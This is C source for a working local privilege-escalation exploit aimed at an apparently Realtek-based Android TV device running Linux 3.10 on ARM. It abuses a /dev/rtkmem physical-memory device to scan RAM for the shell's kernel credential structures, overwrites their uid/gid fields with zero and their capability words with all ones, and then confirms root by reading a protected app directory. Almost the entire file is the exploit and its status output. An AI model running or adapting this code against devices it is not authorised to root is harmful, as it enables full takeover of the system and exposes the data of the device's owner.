/* rtroot.c - minimal privilege escalation via /dev/rtkmem physical R/W.
 *
 * Verified facts (steps 1-2.5):
 *   - mmap offset == byte physical address, PROT_READ|PROT_WRITE works.
 *   - PAGE_OFFSET = 0xC0000000 => virt = phys + 0xC0000000.
 *   - /proc/iomem System RAM 0x00000000-0x5fffffff; scan 0..0x20000000.
 *   - struct cred layout (Linux 3.10 ARM): usage@0, uid..fsgid@4..35,
 *     securebits@36, cap_inheritable/permitted/effective/bounding@40..71.
 *   - SELinux is Disabled on this device, so no LSM context patch needed.
 *   - All adb-shell children share one cred (copy_cred bumps usage), so
 *     patching the uid-2000 cred(s) makes subsequent adb commands root.
 *
 * Safety: ONLY writes 8 u32 uid/gid fields + 8 u32 cap words inside structs
 * that match the strict cred signature. Never touches boot/system/partitions.
 * Worst case is a kernel oops -> automatic reboot -> everything restored.
 *
 * Build: clang --target=armv7a-linux-androideabi19 --static -O2 -o rtroot rtroot.c
 * PT_TLS p_align must be patched to 64.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <grp.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define PAGE_OFFSET 0xC0000000UL
#define SCAN_END    0x20000000UL
#define CHUNK       (1u << 20)
#define CRED_UID_OFF 4
#define CRED_CAP_OFF 40

static sigjmp_buf g_jmp;
static void fault_handler(int sig) { (void)sig; siglongjmp(g_jmp, 1); }

static int fd;

/* Patch one page containing a cred. phys may be unaligned within page. */
static int patch_cred(uint64_t phys, uint32_t uid) {
    uint64_t page = phys & ~(uint64_t)0xfff;
    size_t off = (size_t)(phys - page);
    /* cred needs 72 bytes; ensure it fits in one page (true for our hits) */
    if (off + 80 > 0x1000) return 0;
    void *m = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED,
                   fd, (off_t)page);
    if (m == MAP_FAILED) return 0;
    unsigned char *p = (unsigned char *)m + off;
    if (sigsetjmp(g_jmp, 1)) { munmap(m, 0x1000); return 0; }

    /* Re-validate the exact signature before writing anything. */
    uint32_t w[18];
    memcpy(w, p, sizeof(w));
    if (w[0] < 1 || w[0] > 1000000) { munmap(m, 0x1000); return 0; }
    for (int q = 1; q <= 8; q++) if (w[q] != uid) { munmap(m, 0x1000); return 0; }
    if (w[9] != 0) { munmap(m, 0x1000); return 0; }

    printf("    patching cred phys=0x%llx usage=%u\n",
           (unsigned long long)phys, w[0]);
    fflush(stdout);

    /* uid,gid,suid,sgid,euid,egid,fsuid,fsgid -> 0 */
    for (int q = 1; q <= 8; q++) ((volatile uint32_t *)p)[q] = 0;
    /* Capability sets: only raise words that are currently ZERO. Never
     * overwrite a non-zero word, since tail offsets may hold keyring/user/
     * group_info pointers rather than caps on this vendor kernel. */
    int capwords = 0;
    for (int q = 10; q < 18; q++) {
        if (((volatile uint32_t *)p)[q] == 0) {
            ((volatile uint32_t *)p)[q] = 0xFFFFFFFF;
            capwords++;
        }
    }
    printf("    raised %d zero cap words, uid fields zeroed\n", capwords);

    __sync_synchronize();
    msync(m, 0x1000, MS_SYNC);
    munmap(m, 0x1000);
    return 1;
}

int main(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = fault_handler;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    uid_t uid = getuid();
    printf("[*] rtroot: pid=%d uid=%u euid=%u\n", (int)getpid(), uid, geteuid());
    fflush(stdout);

    fd = open("/dev/rtkmem", O_RDWR);
    if (fd < 0) { printf("open: %s\n", strerror(errno)); return 2; }

    uint64_t found[16];
    int nfound = 0;
    printf("[*] scanning for uid=%u cred structs\n", uid);
    fflush(stdout);
    for (uint64_t p = 0; p < SCAN_END && nfound < 16; p += CHUNK) {
        void *m = mmap(NULL, CHUNK, PROT_READ, MAP_SHARED, fd, (off_t)p);
        if (m == MAP_FAILED) continue;
        unsigned char *v = (unsigned char *)m;
        if (sigsetjmp(g_jmp, 1)) { munmap(m, CHUNK); continue; }
        for (size_t i = 0; i + 80 <= CHUNK && nfound < 16; i += 4) {
            uint32_t w[10];
            memcpy(w, v + i, sizeof(w));
            if (w[0] < 1 || w[0] > 1000000 || w[9] != 0) continue;
            int ok = 1;
            for (int q = 1; q <= 8; q++) if (w[q] != uid) { ok = 0; break; }
            if (!ok) continue;
            found[nfound++] = p + i;
        }
        munmap(m, CHUNK);
    }
    printf("[*] found %d cred candidate(s)\n", nfound);
    for (int i = 0; i < nfound; i++)
        printf("    [%d] phys=0x%llx\n", i, (unsigned long long)found[i]);
    fflush(stdout);

    if (nfound == 0) { printf("[!] no cred found, abort (nothing written)\n"); return 3; }

    int patched = 0;
    for (int i = 0; i < nfound; i++)
        patched += patch_cred(found[i], (uint32_t)uid);
    printf("[*] patched %d cred struct(s)\n", patched);
    fflush(stdout);
    close(fd);

    /* Now ask the kernel who we are. */
    printf("[*] getuid()=%u geteuid()=%u\n", getuid(), geteuid());
    fflush(stdout);
    if (setuid(0) == 0) printf("[*] setuid(0) OK\n");
    else printf("[*] setuid(0) -> %s\n", strerror(errno));
    setgid(0);
    printf("[*] after: getuid()=%u geteuid()=%u getgid()=%u\n",
           getuid(), geteuid(), getgid());
    fflush(stdout);

    /* Strong verification: try to open a root-only directory. */
    struct stat st;
    int r = stat("/data/data/com.studyontv.tv", &st);
    printf("[*] stat(/data/data/com.studyontv.tv) = %d %s\n",
           r, r == 0 ? "<-- ROOT CONFIRMED" : strerror(errno));
    fflush(stdout);

    if (geteuid() == 0 && r == 0) {
        printf("\n[+] ROOT_OK\n");
        return 0;
    }
    printf("\n[!] ROOT_NOT_CONFIRMED\n");
    return 4;
}
